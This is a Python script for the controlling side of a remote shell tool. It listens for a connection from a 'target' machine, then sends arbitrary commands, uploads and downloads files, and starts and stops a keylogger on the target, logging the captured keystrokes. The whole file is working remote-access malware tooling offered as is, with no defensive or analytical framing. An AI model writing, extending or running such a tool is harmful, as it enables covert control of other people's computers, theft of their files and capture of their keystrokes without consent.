# Remote Shell

# Description:
# This script establishes a remote shell connection with a target machine, allowing the execution
# of various commands and file operations.


try:
    import socket
    import threading
    import os
    import json
    from datetime import datetime
except Exception as import_error:
    print(f"import Error: {import_error}")


class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.log_file = None
        self.stop_logging = 0
        self.dump_logging = ""
        self.server_socket = None
        self.target = None

    def dump_log_file(self):
        with open(self.log_file, "a") as log:
            log.write(self.dump_logging)

    def thread_logger(self):
        if self.stop_logging == 0:
            while True:
                R_OUTPUT = self.target.recv(1024).decode()
                print(R_OUTPUT, end='')
                self.dump_logging += R_OUTPUT
        else:
            return

    def send_data_as_json(self, data):
        json_data = json.dumps(data)
        self.target.send(json_data.encode())

    def receive_data_as_json(self):
        received_data = ''
        while True:
            try:
                received_data += self.target.recv(1024).decode().rstrip()
                return json.loads(received_data)
            except json.JSONDecodeError:
                continue

    def upload_file(self, file_name):
        try:
            with open(file_name, 'rb') as up_file:
                self.target.send(up_file.read())
        except Exception as e_upload_file:
            print(f"Error uploading file: {e_upload_file}")

    def download_file(self, file_name):
        try:
            with open(file_name, 'wb') as down_file:
                self.target.settimeout(1)
                while True:
                    chunk = self.target.recv(1024)
                    if not chunk:
                        break
                    down_file.write(chunk)
        except socket.timeout:
            pass
        except Exception as e_download_file:
            print(f"Error downloading file: {e_download_file}")
        finally:
            self.target.settimeout(None)

    def start(self):
        self.log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y_%H-%M")}.txt'

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.port))
        print("[•] Listening for incoming connections")
        self.server_socket.listen(5)

        # Accept a connection from the target
        self.target, r_host = self.server_socket.accept()
        print("[+] connected to: " + str(r_host))

        while True:
            command = input("[$] shell~# ")
            if command == '':
                continue

            elif command.lower() == 'help':
                print("""
                
                    [*] Shell commands:
                
                
                    • keyscan_start - Start the keylogger.
                
                    • keyscan_stop - Stop the keylogger and save the log to a file in the script's directory.
                
                
                    • download <file_name> - Download a file from the target.
                
                    • upload <file_name> - Upload a file to the target.
                
                
                    • clear or cls - Clear the screen.
                
                
                    • quit - Quit the shell and close the connection.
                
                
                    Note: Replace <file_name> with the name of the file you want to download or upload.
                
                    """)
                continue

            self.send_data_as_json(command)

            if command.lower() == 'quit':
                self.dump_log_file()
                self.target.close()
                exit(0)

            elif command.startswith('cd '):
                pass

            elif command in ['clear', 'cls']:
                clear_command = 'clear' if command == 'clear' else 'cls'
                os.system(clear_command)

            elif command.lower() == 'keyscan_start':
                print("[+] Keylogger started.")
                thread_Log = threading.Thread(target=self.thread_logger)
                thread_Log.start()

            elif command.lower() == 'keyscan_stop':
                self.dump_log_file()
                self.stop_logging = 1
                print("[-] Keylogger stopped.")
                print("[+] keylog saved to Dump file")

            elif command.startswith('download'):
                self.download_file(command[9:])
            elif command.startswith('upload'):
                self.upload_file(command[7:])

            else:
                result = self.receive_data_as_json()
                print(result)


if __name__ == "__main__":
    server = Server('192.168.0.0', 5555)  # enter ip and port
    server.start()
